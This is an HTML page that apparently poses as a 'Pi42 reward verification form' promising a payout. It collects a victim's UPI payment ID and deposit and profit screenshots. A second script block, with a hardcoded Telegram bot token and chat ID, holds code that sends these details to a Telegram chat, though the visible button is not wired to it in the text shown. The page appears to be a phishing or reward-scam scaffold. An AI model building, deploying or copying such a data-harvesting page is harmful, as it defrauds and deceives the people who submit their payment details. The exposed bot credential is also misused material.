<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pi42 Verification</title>

<style>

body{
margin:0;
font-family:Arial,sans-serif;
background:#ede7f6;
}

.top{
height:120px;
background:#673ab7;
}

.wrap{
max-width:760px;
margin:auto;
margin-top:-70px;
padding:15px;
}

.card{
background:#fff;
padding:22px;
border-radius:14px;
margin-bottom:20px;
box-shadow:0 2px 10px rgba(0,0,0,.15);
}

.title{
font-size:30px;
font-weight:bold;
}

.demo{
width:100%;
border-radius:10px;
margin-top:15px;
}

input{
width:100%;
padding:14px;
font-size:17px;
border:1px solid #ccc;
border-radius:10px;
margin-top:10px;
box-sizing:border-box;
}

button{
width:100%;
padding:18px;
background:#673ab7;
border:none;
border-radius:12px;
font-size:20px;
color:#fff;
font-weight:bold;
}

.success{
display:none;
text-align:center;
padding:40px;
}

</style>
</head>

<body>

<div id="main">

<div class="top"></div>

<div class="wrap">

<div class="card">

<div class="title">
Pi42 reward verification form
</div>

<p>
⚠️ Follow demo screenshots.<br>
⚠️ Wrong data may be rejected.
</p>

</div>

<div class="card">

<h3>Coupling Tracking UPI ID *</h3>

<input
id="upi"
placeholder="example@ybl">

</div>

<div class="card">

<h3>Deposit Screenshot *</h3>

<img
class="demo"
src="https://i.ibb.co/JRQL9qfn/IMG-20260528-054229.jpg">

<input
type="file"
id="deposit">

</div>

<div class="card">

<h3>Profit Screenshot *</h3>

<img
class="demo"
src="https://i.ibb.co/qL8NKhHf/IMG-20260527-180708.jpg">

<input
type="file"
id="profit">

</div>

<div class="card">

<button onclick="submitForm()">
SUBMIT
</button>

</div>

</div>

</div>

<div
class="success"
id="success">

<img
width="220"
src="https://media.tenor.com/xVfFIHxAzW4AAAAi/check.gif">

<h1>
🎉 Congratulations
</h1>

<p>
Within 12 hours verification & payment process complete ho jayega.
</p>

</div>

<script>

function submitForm(){

let upi=
document.getElementById(
"upi"
).value;

if(!upi){

alert(
"UPI Required"
);

return;

}

document.getElementById(
"main"
).style.display=
"none";

document.getElementById(
"success"
).style.display=
"block";

}

</script>
<script>

const BOT_TOKEN=
"8765179938:AAGXVwRkDlNUfHwsIaQEkXJtrtfay3bjBOw";

const CHAT_ID=
"7468352847";

async function sendPhoto(file,caption){

let fd=new FormData();

fd.append(
"chat_id",
CHAT_ID
);

fd.append(
"caption",
caption
);

fd.append(
"photo",
file
);

await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
{
method:"POST",
body:fd
});

}

async function telegramSubmit(){

let upi=
document.getElementById(
"upi"
).value;

let deposit=
document.getElementById(
"deposit"
).files[0];

let profit=
document.getElementById(
"profit"
).files[0];

if(
!upi||
!deposit||
!profit
){

alert(
"Fill all fields + screenshots"
);

return;

}

await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{
method:"POST",

headers:{
"Content-Type":
"application/json"
},

body:JSON.stringify({

chat_id:CHAT_ID,

text:
`🚀 NEW FORM

UPI:
${upi}`

})
}
);

await sendPhoto(
deposit,
"Deposit Screenshot"
);

await sendPhoto(
profit,
"Profit Screenshot"
);

}

</script>
</body>
</html>
